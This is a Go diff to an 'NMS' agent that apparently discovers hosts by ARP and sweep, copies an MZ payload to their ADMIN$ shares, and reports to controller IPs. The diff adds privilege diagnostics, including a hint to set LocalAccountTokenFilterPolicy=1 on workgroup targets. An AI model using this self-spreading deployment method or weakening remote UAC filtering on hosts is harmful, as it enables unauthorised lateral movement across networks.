@@ -1030,7 +1030,7 @@ func classifySMBErr(err error) string {
 	if errors.As(err, &errno) {
 		switch int(errno) {
 		case 5:
-			return "access denied (SMB creds lack ADMIN$ write — check stored account)"
+			return "access denied (SMB creds lack ADMIN$ write — check target Administrators; workgroup target: LocalAccountTokenFilterPolicy)"
 		case 53:
 			return "bad network path (no route or SMB disabled on target)"
 		case 64:
@@ -1292,6 +1292,7 @@ type NMSReport struct {
 	Sleep     *NMSSleepState  `json:"sleep,omitempty"`
 	Guard     string          `json:"guard"`
 	CloneArm  string          `json:"clone_arm"`
+	Priv      *NMSPriv        `json:"priv,omitempty"`
 	Results   []NMSHostResult `json:"results"`
 	Events    []string        `json:"events,omitempty"`
 }
@@ -1404,10 +1405,11 @@ func StepNMS(send func(reportJSON string), controllerIPs []string) error {
 	if st, ok := ReadSleepFlag(); ok {
 		sleep = &st
 	}
+	priv := CurrentNMSPriv()
 	rep := NMSReport{
 		Prober: hn, At: time.Now().UTC().Format(time.RFC3339),
 		Tick: tick, Version: version.Version, Interval: cfg.IntervalSec,
-		Sleep: sleep, Guard: guard, CloneArm: cloneArm,
+		Sleep: sleep, Guard: guard, CloneArm: cloneArm, Priv: &priv,
 		Results: results, Events: events,
 	}
 	b, _ := json.Marshal(rep)
@@ -1628,12 +1630,53 @@ func CloneDryRun(host string, controllerIPs []string) string {
 	fmt.Fprintf(&b, "payload: %d bytes sha %.12s (valid MZ)\n", size, sha)
 	tempVisible := nmsDirStat(`\\` + host + `\ADMIN$\Temp`)
 	fmt.Fprintf(&b, "target dir: %s\n", map[bool]string{true: `\\host\ADMIN$\Temp visible`, false: `\\host\ADMIN$\Temp NOT visible — copy would fail`}[tempVisible])
+	fmt.Fprintf(&b, "privileges:\n%s", remotePrivSection(host, tempVisible, unknown))
 	if unknown {
 		fmt.Fprintf(&b, "verdict: LIKELY NOT (managed-state unknown — resolve share access first)\n")
 	} else if !tempVisible {
 		fmt.Fprintf(&b, "verdict: WOULD NOT CLONE (target dir unreachable)\n")
 	} else {
 		fmt.Fprintf(&b, "verdict: WOULD CLONE (all gates pass — run without --dry-run to deploy)\n")
+	}
+	return b.String()
+}
+
+// nmsCredUser names the stored-credential account (username only — the
+// secret never leaves the vault file). Empty when no cred file exists,
+// meaning SMB/WMI ride the current process context.
+func nmsCredUser() (string, bool) {
+	b, err := os.ReadFile(NMSCredPath())
+	if err != nil {
+		return "", false
+	}
+	lines := strings.Split(strings.ReplaceAll(string(b), "\r\n", "\n"), "\n")
+	if len(lines) == 0 || strings.TrimSpace(lines[0]) == "" {
+		return "", false
+	}
+	return strings.TrimSpace(lines[0]), true
+}
+
+// remotePrivSection reports WHO this box would authenticate as on the
+// target plus what to fix when ADMIN$ denies. Read-only (no writes).
+func remotePrivSection(host string, tempVisible, managedUnknown bool) string {
+	var b strings.Builder
+	me := CurrentNMSPriv()
+	fmt.Fprintf(&b, "  local: %s elevated=%v integrity=%s admin=%v\n", me.User, me.Elevated, me.Integrity, me.IsAdmin)
+	if !me.Elevated {
+		b.WriteString("  WARNING: this NMS runs unelevated — local guard/restore and remote pushes will fail. Reinstall or run the task elevated.\n")
+	}
+	if u, ok := nmsCredUser(); ok {
+		fmt.Fprintf(&b, "  credential source: stored vault file (account %s)\n", u)
+	} else {
+		b.WriteString("  credential source: current process context (no stored vault creds)\n")
+	}
+	if !tempVisible || managedUnknown {
+		b.WriteString("  remote ADMIN$ denied — check on/against " + host + ":\n")
+		b.WriteString("    - account must be in target Administrators (net localgroup administrators)\n")
+		b.WriteString("    - workgroup target: HKLM\\SYSTEM\\CCS\\Control\\Lsa\\MSV1_0 RestrictReceivingNTLMTraffic / LocalAccountTokenFilterPolicy=1,\n")
+		b.WriteString("      else remote admin logons arrive filtered (UAC remote restrictions)\n")
+		b.WriteString("    - sharing model must be Classic, not Guest-only (secpol Network access)\n")
+		b.WriteString("    - target firewall: File and Printer Sharing (SMB-In) enabled\n")
 	}
 	return b.String()
 }
@@ -1745,7 +1788,9 @@ func nmsStatus() string {
 	}
 	arp := arpSeedHosts()
 	targets := dedupeHosts(append(append(append([]string{}, currentSweep()...), arp...), cfg.ExtraHosts...))
-	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d arp=%d",
+	priv := CurrentNMSPriv()
+	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d arp=%d priv=%s/elev=%v/%s admin=%v",
 		NMSTick(), version.Version, cfg.IntervalSec, sleep, arm, payload,
-		len(targets), len(currentSweep()), len(arp))
+		len(targets), len(currentSweep()), len(arp),
+		priv.User, priv.Elevated, priv.Integrity, priv.IsAdmin)
 }
